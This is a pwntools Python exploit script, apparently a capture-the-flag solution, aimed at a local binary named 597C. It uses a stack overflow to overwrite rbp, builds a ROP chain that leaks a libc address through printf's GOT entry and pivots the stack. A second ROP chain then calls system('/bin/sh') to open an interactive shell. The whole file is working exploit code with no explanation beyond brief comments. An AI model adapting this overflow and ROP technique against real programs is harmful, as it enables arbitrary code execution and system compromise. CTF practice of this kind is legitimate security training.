from pwn import *
import time

#init

e = ELF('./597C')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#funcs

def pr(x):
    global w
    w -= 1
    p.sendline(str(x))

def num(x, y):
    #generate sequences of length 9 that correspondes to powers of 0x80
    #add one more value to each sequence that signifies the digit base 0x80 to create numbers
    for i in reversed(range(10)):
        for j in range(i):
            for l in range(0x80):
                pr(x + 10 * i + j)
        for j in range(i, 9):
            pr(x + 10 * i + j)
        for j in range((y >> (7 * i)) & 0x7f):
            pr(x + 10 * i + 9)

#vars

n = 122220
off1 = 0x1000
off2 = 0x2000
off3 = 0x3000

arr = e.sym['a']
scanf_plt = e.plt['__isoc99_scanf']
printf_got = e.got['printf']
printf_off = libc.sym['printf']

log.info('Arr adr: ' + hex(arr))
log.info('Scanf plt adr: ' + hex(scanf_plt))
log.info('Printf got adr: ' + hex(printf_got))
log.info('Printf libc off: ' + hex(printf_off))

#exploit

#use large test value that allows overflow

p.sendline(f'{n} 10')

w = n

#overwrite rbp to point backward on stack

num(off3, (1 << 64) + 0x8 * (off2 - n - 8))
pr(n)

#rop leak libc and input and pivot to second rop chain

rop = ROP(e)
rop.printf(arr + 0x4 * (n - 1), printf_got)
rop.call(scanf_plt, [arr + 0x4 * (n - 1), arr + 0x800])
rop.migrate(arr + 0x800)

log.info('ROP chain:\n' + rop.dump())

a = rop.build()

for i in range(len(a)):
    if type(a[i]) is bytes:
        a[i] = u64(a[i].ljust(8, b'\x00'))

#account for bit operations

for i in range(len(a)):
    x = off2 + i + 1
    while (x + (x & -x)) <= off2 + len(a):
        x += (x & -x)
        y = x - off2 - 1
        a[y] -= a[i]

        if(a[y] < 0):
            a[y] += (1 << 64)

for i in range(len(a) - 1):
    a[i] -= a[i + 1]

    if a[i] < 0:
        a[i] += (1 << 64)

#write rop chain

for i in reversed(range(len(a))):
    num(off1 + 0x100 * i, a[i])
    pr(off2 + i)

#finish rest

while w > 1:
    pr(1)

#add '%s' string for scanf in rop chain

pr(u64(b'%s'.ljust(8, b'\x00')))

#get libc leak

p.recvline()
libc_off = u64(p.recv(6).ljust(8, b'\x00')) - printf_off

log.info('Libc off adr: ' + hex(libc_off))

#send 2nd rop to call system('/bin/sh')

libc.address = libc_off
rop = ROP(libc, arr + 0x800)
rop.system('/bin/sh')

p.sendline(rop.chain())

#pray for flag

p.interactive()
